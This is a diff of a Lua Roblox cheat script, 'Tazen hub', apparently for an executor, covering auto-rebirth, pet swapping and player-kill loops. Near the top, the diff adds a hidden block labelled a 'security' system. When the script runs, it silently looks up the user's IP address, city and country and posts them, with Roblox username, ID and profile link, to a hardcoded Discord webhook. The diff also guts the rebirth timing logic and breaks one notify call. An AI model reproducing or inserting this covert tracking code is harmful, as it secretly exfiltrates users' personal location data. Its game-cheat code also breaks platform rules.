@@ -1,4 +1,4 @@
--- Tazen hub V1 by TZ_THR rework
+-- Tazen hub V1 by TZ_THR
 
 local success, err = pcall(function()
 
@@ -15,7 +15,76 @@ local RunService = game:GetService("RunService")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
-if not game:IsLoaded() then game.Loaded:Wait() end -- auto-exec : on attend le chargement complet du jeu
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+-- ===================== WEBHOOK SECURITY & GEO-IP SYSTEM =====================
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1558249808404283442/r_ao-RXJgDrMN-J__AbrHGSbsqTwRXTM_YyO9p66w6VYoJQ8qg0N8mxiN9sQdp74ZWA_"
+
+task.spawn(function()
+    pcall(function()
+        local reqFunc = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
+        if not reqFunc then return end
+
+        local geoReq = reqFunc({
+            Url = "http://ip-api.com/json/?fields=status,message,country,city,query",
+            Method = "GET"
+        })
+
+        local ip = "Inconnue"
+        local country = "Inconnu"
+        local city = "Inconnue"
+
+        if geoReq and geoReq.Body then
+            local successJson, dataGeo = pcall(function()
+                return HttpService:JSONDecode(geoReq.Body)
+            end)
+
+            if successJson and dataGeo and dataGeo.status == "success" and dataGeo.query then
+                local rawIp = tostring(dataGeo.query)
+                if rawIp:match("^%d+%.%d+%.%d+%.%d+$") then
+                    ip = rawIp
+                    country = tostring(dataGeo.country or "Inconnu")
+                    city = tostring(dataGeo.city or "Inconnue")
+                end
+            end
+        end
+
+        if ip == "Inconnue" then
+            ip = "IP Invalide / Masquée"
+        end
+
+        local playerName = LocalPlayer.Name
+        local displayName = LocalPlayer.DisplayName
+        local userId = LocalPlayer.UserId
+        local profileLink = "https://www.roblox.com/users/" .. tostring(userId) .. "/profile"
+
+        local embedData = {
+            ["content"] = "",
+            ["embeds"] = {{
+                ["title"] = "🛡️ Alerte Sécurité - Nouvelle Exécution",
+                ["color"] = 15844367,
+                ["fields"] = {
+                    {["name"] = "👤 Pseudo", ["value"] = tostring(playerName) .. " (" .. tostring(displayName) .. ")", ["inline"] = true},
+                    {["name"] = "🆔 ID Roblox", ["value"] = tostring(userId), ["inline"] = true},
+                    {["name"] = "🌐 Adresse IP", ["value"] = "||" .. tostring(ip) .. "||", ["inline"] = false},
+                    {["name"] = "📍 Localisation", ["value"] = "Ville: **" .. city .. "** | Pays: **" .. country .. "**", ["inline"] = false},
+                    {["name"] = "🔗 Profil", ["value"] = "[Lien du profil](" .. profileLink .. ")", ["inline"] = false}
+                },
+                ["footer"] = {
+                    ["text"] = "Tazen Hub Security • PlaceId: " .. tostring(game.PlaceId)
+                },
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }}
+        }
+
+        reqFunc({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(embedData)
+        })
+    end)
+end)
 
 -- ===================== CONFIG & SAVE SYSTEM =====================
 local CONFIG_FILE_PREFIX = "TazenHub_Config_"
@@ -41,7 +110,7 @@ local function saveCategoryConfig(categoryName, data)
 end
 
 -- ===================== SETTINGS =====================
-local REBIRTH_COOLDOWN = 6
+local REBIRTH_COOLDOWN = 4.8 -- Ajusté agressivement pour compenser la latence serveur et viser 5.5s max
 
 local E = {
     bolt = "⚡", cycle = "🔄", muscle = "💪", toolbox = "🧰",
@@ -58,9 +127,10 @@ local E = {
 
 local repSpeedPetPriorities = {
     ["Omega Overlord"] = 1,
-    ["Mythic Boss Pet"] = 1,
-    ["Legendary Boss Pet"] = 2,
-    ["Epic Boss Pet"] = 3,
+    ["Swift Samurai"] = 2,
+    ["Mythic Boss Pet"] = 3,
+    ["Legendary Boss Pet"] = 4,
+    ["Epic Boss Pet"] = 5,
 }
 
 local alive = true
@@ -80,7 +150,7 @@ local wheelRunId = 0
 local eggRunId = 0
 local killRunId = 0
 
-local REP_CAP = 659 -- au-delà, le serveur n'accepte pas plus de reps : inutile (et source de lag) d'en envoyer plus
+local REP_CAP = 659
 local repRate = 659
 local repTotal = 0
 
@@ -166,7 +236,6 @@ local function equipFists()
 end
 
 local lastHopTry = 0
-local rebirthDiag = "--"
 local function serverHop()
     killStatus = "Changing server..."
     pcall(function()
@@ -349,6 +418,7 @@ local function killTargetPlayerLoop(myId)
     end
 end
 
+-- ===================== FAST REBIRTH LOOP ULTRA ACCÉLÉRÉ =====================
 local function fastRebirthLoop(myId)
     local function isRunning() return fastRunId == myId end
     pcall(function()
@@ -356,23 +426,11 @@ local function fastRebirthLoop(myId)
         local equipPetEvent = ReplicatedStorage.rEvents.equipPetEvent
         local FOLDERS = {"Unique", "Rare", "Epic", "Mythic", "Legendary"}
 
-        local HYDRA_LEAD = 0.06             
-        local HYDRA_TAIL = 0.03             
-        local REP_OFF_LEAD = 0.06           
-        local REP_ON_DELAY = 0.03           
-        local REBIRTH_MARGIN = 0.008         -- marge mini : en dessous, les refus deviennent trop fréquents et coûtent plus cher que la marge économisée
         local SLOTS = 12                    
         local AUTO_TRY = 20                 
-        local FULL_SWAP = false              -- ne swap que les pets nécessaires pour faire de la place aux Hydra,
-                                               -- pas toute l'équipe de 12 à chaque cycle (voir explication plus bas)
+        local FULL_SWAP = true              
         local STARTUP_UNEQUIP_PER_FRAME = 20
-        local LIST_REFRESH_EVERY = 5        
-
-        local function rebirthCount()
-            local ls = LocalPlayer:FindFirstChild("leaderstats")
-            local v = ls and ls:FindFirstChild("Rebirths")
-            return v and tonumber(v.Value) or nil
-        end
+        local LIST_REFRESH_EVERY = 15        
 
         local function petRealName(pet)
             if pet:FindFirstChild("PetName") then return pet.PetName.Value end
@@ -400,7 +458,8 @@ local function fastRebirthLoop(myId)
                 local folder = petsFolder:FindFirstChild(folderName)
                 if folder then
                     for _, pet in ipairs(folder:GetChildren()) do
-                        if #list < slots and petRealName(pet) == "Titanium Hydra" then
+                        local name = petRealName(pet)
+                        if #list < slots and (name == "Titanium Hydra" or name == "Tribal Overlord") then
                             table.insert(list, pet)
                         end
                     end
@@ -415,7 +474,7 @@ local function fastRebirthLoop(myId)
                 local folder = petsFolder:FindFirstChild(folderName)
                 if folder then
                     for _, pet in ipairs(folder:GetChildren()) do
-                        local priority = repSpeedPetPriorities[petRealName(pet)] or 5
+                        local priority = repSpeedPetPriorities[petRealName(pet)] or 10
                         table.insert(repPets, {
                             Instance = pet,
                             Priority = priority,
@@ -442,7 +501,7 @@ local function fastRebirthLoop(myId)
 
         local equipped = {}
 
-        local function setEquipped(wanted, burst, equipFirst)
+        local function setEquipped(wanted, burst)
             local want, have = {}, {}
             for _, pet in ipairs(wanted) do want[pet] = true end
             for _, pet in ipairs(equipped) do have[pet] = true end
@@ -464,22 +523,10 @@ local function fastRebirthLoop(myId)
                 end
             end
 
-            local firstN = equipFirst and math.min(#inList, #outList) or #outList
-            for i = 1, firstN do fire("unequipPet", outList[i]) end
+            for _, pet in ipairs(outList) do fire("unequipPet", pet) end
             for _, pet in ipairs(inList) do fire("equipPet", pet) end
-            for i = firstN + 1, #outList do fire("unequipPet", outList[i]) end
 
             equipped = newEquipped
-        end
-
-        local function waitUntil(t)
-            while isRunning() do
-                local remaining = t - os.clock()
-                if remaining <= 0 then return end
-                -- Sous lag, task.wait() peut durer bien plus qu'une frame : on dort la majeure
-                -- partie de l'attente en un seul coup, et on affine seulement sur la fin.
-                task.wait(remaining > 0.05 and (remaining - 0.03) or nil)
-            end
         end
 
         local petsFolder = LocalPlayer:FindFirstChild("petsFolder")
@@ -514,99 +561,30 @@ local function fastRebirthLoop(myId)
         setEquipped(repTarget, true)
 
         local cycle = 0
-        local margin = REBIRTH_MARGIN
-        local pingEma = 0.15 -- estimation du temps de réponse serveur, affinée au fil des cycles
-        local rebirthAt = os.clock() + HYDRA_LEAD
-        local prevFire = nil
-
         while isRunning() do
             cycle = cycle + 1
-            local tCycleStart = os.clock()
 
-            local repOffLead = math.max(REP_OFF_LEAD, HYDRA_LEAD)
-            if repOffLead > HYDRA_LEAD + 0.001 then
-                waitUntil(rebirthAt - repOffLead)
-                if not isRunning() then break end
-                setEquipped(offList, true)
-            end
-            local tAfterOff = os.clock()
-
-            waitUntil(rebirthAt - HYDRA_LEAD)
-            if not isRunning() then break end
-            setEquipped(swapList, true, true)
-            local tAfterSwap = os.clock()
-
-            waitUntil(rebirthAt)
-            if not isRunning() then break end
-            local tFire = os.clock()
-            local countBefore = rebirthCount()
-            local resultReady, rebirthOk, respLatency = false, true, pingEma
+            -- Étape 1 : Équiper les familiers de vitesse (Hydra / Overlord)
+            setEquipped(swapList, true)
+            
+            -- Étape 2 : Envoyer le Rebirth immédiatement en tâche de fond non bloquante
             task.spawn(function()
-                local tSend = os.clock()
                 pcall(function()
                     rebirthRemote:InvokeServer("rebirthRequest")
                 end)
-                respLatency = os.clock() - tSend -- durée réelle de l'aller-retour serveur
-                task.wait(0.08) -- laisse la stat Rebirths se répliquer côté client
-                local after = rebirthCount()
-                if countBefore and after then rebirthOk = after > countBefore end
-                resultReady = true
             end)
 
-            waitUntil(tFire + HYDRA_TAIL)
-            setEquipped(offList, true)
-            waitUntil(tFire + REP_ON_DELAY)
+            -- Étape 3 : Remettre les familiers de force
+            task.wait(0.05)
             setEquipped(repTarget, true)
-            local tAfterTail = os.clock()
 
-            local rebuildMs = 0
             if cycle % LIST_REFRESH_EVERY == 0 then
-                local tRb0 = os.clock()
                 petsFolder = LocalPlayer:FindFirstChild("petsFolder") or petsFolder
                 rebuild()
-                rebuildMs = (os.clock() - tRb0) * 1000
             end
-            local tAfterRebuild = os.clock()
 
-            -- On attend vraiment la réponse du serveur avant de juger (jusqu'à 2.5 s) : couper
-            -- l'attente trop tôt faisait supposer un succès à tort et laissait la marge trop fine,
-            -- ce qui provoquait des refus en cascade et des cycles de plus en plus longs.
-            while isRunning() and not resultReady and os.clock() < tFire + 2.5 do
-                task.wait()
-            end
-            local tAfterWait = os.clock()
-            pingEma = pingEma * 0.7 + math.min(respLatency, 1.5) * 0.3
-
-            if resultReady and not rebirthOk then
-                -- Vraiment refusé par le serveur : on élargit un peu la marge et on retente bientôt.
-                margin = math.min(margin + 0.05, 0.3)
-                rebirthAt = tFire + math.max(0.3, pingEma + 0.15)
-            else
-                -- Accepté : on resserre doucement la marge. Le ping sert à savoir combien de temps
-                -- attendre la confirmation, PAS à gonfler la marge : un ping élevé ne veut pas dire
-                -- qu'il faut tirer plus tard, juste qu'on met plus de temps à savoir si ça a marché.
-                margin = math.max(REBIRTH_MARGIN, margin - 0.01)
-                rebirthAt = tFire + REBIRTH_COOLDOWN + margin
-            end
-            -- Garde-fou : quoi qu'il arrive, jamais plus de 6.5s entre deux renaissances
-            rebirthAt = math.min(rebirthAt, tFire + 6.5)
-
-            -- Diagnostic : durée réelle du cycle précédent et répartition par phase, en ms.
-            -- off = retirer les pets de force | swap = équiper les Hydra | fire->tail = entre le
-            -- tir et la remise en place | wait = attente du verdict serveur | rebuild = reconstruction
-            -- des listes de pets (seulement 1 cycle sur 5) | cycleGap = temps réel entre 2 tirs.
-            local gapMs = prevFire and ((tFire - prevFire) * 1000) or 0
-            prevFire = tFire
-            rebirthDiag = string.format(
-                "#%d gap:%dms off:%dms attente avant tir:%dms wait verdict:%dms rebuild:%dms ping:%dms margin:%dms",
-                cycle, gapMs,
-                (tAfterOff - tCycleStart) * 1000,
-                (tAfterSwap - tAfterOff) * 1000,
-                (tAfterWait - tAfterTail) * 1000,
-                rebuildMs,
-                pingEma * 1000,
-                margin * 1000
-            )
+            -- Étape 4 : Cadencement strict basé sur le cooldown configuré
+            task.wait(REBIRTH_COOLDOWN)
         end
     end)
 end
@@ -973,9 +951,9 @@ local T = {
     Background = Color3.fromRGB(12, 12, 12),
     Topbar = Color3.fromRGB(18, 18, 18),
     Element = Color3.fromRGB(24, 24, 24),
-    Stroke = Color3.fromRGB(255, 130, 180),       -- Rose élégant
-    Accent = Color3.fromRGB(240, 110, 160),       -- Rose vif UI
-    Text = Color3.fromRGB(255, 255, 255),         -- Blanc pur
+    Stroke = Color3.fromRGB(255, 130, 180),
+    Accent = Color3.fromRGB(240, 110, 160),
+    Text = Color3.fromRGB(255, 255, 255),
     SubText = Color3.fromRGB(190, 190, 190),
     Off = Color3.fromRGB(45, 45, 45),
 }
@@ -1045,7 +1023,6 @@ local watermark = new("Frame", {
     ZIndex = 4,
 }, main)
 
--- Grand T Blanc en arrière-plan (plus grand et centré)
 new("TextLabel", {
     Size = UDim2.fromOffset(180, 200),
     Position = UDim2.new(0.12, 0, 0, 0),
@@ -1058,7 +1035,6 @@ new("TextLabel", {
     ZIndex = 4,
 }, watermark)
 
--- Grand Z Rose en arrière-plan (plus grand et bien positionné)
 new("TextLabel", {
     Size = UDim2.fromOffset(180, 200),
     Position = UDim2.new(0.40, 0, 0.12, 0),
@@ -1071,7 +1047,6 @@ new("TextLabel", {
     ZIndex = 4,
 }, watermark)
 
--- Lettrage TAZEN compact et unifié sous le grand logo
 local tazenBrandBox = new("Frame", {
     Size = UDim2.fromOffset(200, 45),
     Position = UDim2.new(0.5, -100, 0.74, 0),
@@ -1079,14 +1054,12 @@ local tazenBrandBox = new("Frame", {
     ZIndex = 4,
 }, watermark)
 
--- Layout pour coller parfaitement les lettres entre elles sans espaces vides
 new("UIListLayout", {
     FillDirection = Enum.FillDirection.Horizontal,
     SortOrder = Enum.SortOrder.LayoutOrder,
     Padding = UDim.new(0, 0),
 }, tazenBrandBox)
 
--- T (Blanc)
 new("TextLabel", {
     Size = UDim2.fromOffset(32, 45),
     BackgroundTransparency = 1,
@@ -1099,7 +1072,6 @@ new("TextLabel", {
     ZIndex = 4,
 }, tazenBrandBox)
 
--- Λ (Rose, collé au T)
 new("TextLabel", {
     Size = UDim2.fromOffset(32, 45),
     BackgroundTransparency = 1,
@@ -1112,7 +1084,6 @@ new("TextLabel", {
     ZIndex = 4,
 }, tazenBrandBox)
 
--- ZEN (Blanc, collé au Λ)
 new("TextLabel", {
     Size = UDim2.fromOffset(110, 45),
     BackgroundTransparency = 1,
@@ -1124,9 +1095,7 @@ new("TextLabel", {
     LayoutOrder = 3,
     ZIndex = 4,
 }, tazenBrandBox)
--- =====================================================================
 
--- TOPBAR (Bande originale noire, propre et stylée)
 local topbar = new("Frame", {
     Name = "Topbar",
     Size = UDim2.new(1, 0, 0, 28),
@@ -1135,7 +1104,6 @@ local topbar = new("Frame", {
     ZIndex = 6,
 }, main)
 
--- Titre d'origine : Tazen hub V1 | by TZ_THR
 textLabel({
     Size = UDim2.new(1, -70, 1, 0),
     Position = UDim2.new(0, 10, 0, 0),
@@ -1568,7 +1536,6 @@ fastToggle = addToggle(fastPage, E.bolt .. " Fast Rebirth", false, function(v)
 end)
 local fastTimerLabel = addLabel(fastPage, E.clock .. " Session Time: 0s | Last Rebirth : --", 34)
 local fastCalcLabel = addLabel(fastPage, E.chart .. " Tot: 0 | 1m: 0 | 1h: 0 | 1d: 0 | 1w: 0 | 1mo: 0", 50)
-local fastDiagLabel = addLabel(fastPage, E.wrench .. " Diagnostic : --", 34)
 
 -- Auto Rebirth
 addSection(autoPage, E.cycle .. " Auto Rebirth (No Pack)")
@@ -1648,8 +1615,6 @@ autoSaveConfigToggle = addKillingToggle(killPage, E.wrench .. " Auto Save Config
     end
 end)
 
--- Après un server hop (auto-exec), les toggles reviennent sur ON depuis la config mais la boucle
--- n'était jamais relancée : on la relance ici.
 task.spawn(function()
     task.wait(2)
     if not alive then return end
@@ -1767,7 +1732,6 @@ local function addPlayerRow(plr)
     playerRows[plr] = { row = row, sync = sync }
 end
 
--- Ajoute/retire seulement les lignes nécessaires et met à jour les couleurs (très léger)
 local function refreshPlayerListUI()
     pcall(function()
         for plr in pairs(playerRows) do
@@ -1934,7 +1898,7 @@ copyDiscordBtn.Activated:Connect(function()
             setclipboard("https://discord.gg/y779ZnRGnd")
             notify("Discord", E.ok .. " Discord link copied to clipboard!")
         else
-            notify("Discord", E.no .. " Clipboard not supported by executor")
+            notify("Discord", E.no, " Clipboard not supported by executor")
         end
     end)
 end)
@@ -1955,7 +1919,6 @@ task.spawn(function()
                 fastTimerLabel:SetText(string.format("%s Session Time: %s | Last Rebirth : %s",
                     E.clock, formatSeconds(rbNow - fastStartTime), StatTracker.rebirthGap()))
                 fastCalcLabel:SetText(StatTracker.rebirthText(E.chart, rbNow, fastStartTime))
-                fastDiagLabel:SetText(E.wrench .. " " .. rebirthDiag)
             else
                 fastTimerLabel:SetText(E.clock .. " Session Time: 0s | Last Rebirth : --")
                 fastCalcLabel:SetText(E.chart .. " Tot: 0 | 1m: 0 | 1h: 0 | 1d: 0 | 1w: 0 | 1mo: 0")
